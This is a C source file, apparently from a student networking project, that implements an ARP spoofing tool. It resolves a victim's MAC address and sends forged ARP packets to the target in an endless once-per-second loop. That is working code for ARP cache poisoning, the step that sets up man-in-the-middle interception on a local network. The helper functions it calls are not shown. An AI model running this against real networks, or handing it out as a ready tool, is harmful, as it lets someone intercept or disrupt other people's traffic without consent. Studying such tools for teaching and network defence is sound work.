/*
** EPITECH PROJECT, 2019
** NWP_myarpspoof_2018
** File description:
** spoof
*/

#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <netinet/ether.h>
#include <unistd.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include "arpspoof.h"

static void print_mac_address(uint8_t mac[ETH_ALEN])
{
    char *sep = "";

    for (size_t i = 0; i < ETH_ALEN; ++i) {
        printf("%s%02X", sep, mac[i]);
        sep = ":";
    }
}

int arp_spoof(arp_t *arp)
{
    arp_packet_t packet;
    struct sockaddr_ll dest_addr = create_dest_address(arp->iface);
    socklen_t addr_size = sizeof(struct sockaddr_ll);
    int sock = create_socket();
    uint8_t *mac = get_mac_of(arp->dest_ip, arp->iface);

    arp->mac_address = char6_to_mac((unsigned char *)mac);
    free(mac);
    init_spoofed(&packet, arp);
    memcpy(dest_addr.sll_addr, packet.eth_hdr.ether_dhost, ETH_ALEN);
    printf("Found victim’s MAC address: '");
    print_mac_address(packet.eth_hdr.ether_dhost);
    printf("'\n");
    while (true) {
        if (sendto(sock, &packet, sizeof(arp_packet_t), 0,
                (struct sockaddr *) &dest_addr, addr_size) == -1) {
            perror("sendto");
        }
        printf("Spoofed packet sent to '%s'\n", arp->dest_ip);
        print_packet((unsigned char *)&packet, sizeof(arp_packet_t));
        sleep(1);
    }
}

void free_arp(arp_t *arp)
{
    free(arp->dest_ip);
    free(arp->iface);
    free(arp->mac_address);
    free(arp->source_ip);
    free(arp);
}

int my_arpspoof(arp_t *arp)
{
    int n;

    if (arp->spoof_opt == 1)
        n = print_spoofed(arp);
    else if (arp->broadcast_opt == 1)
        n = print_broadcast(arp);
    else
        n = arp_spoof(arp);
    free_arp(arp);
    return n;
}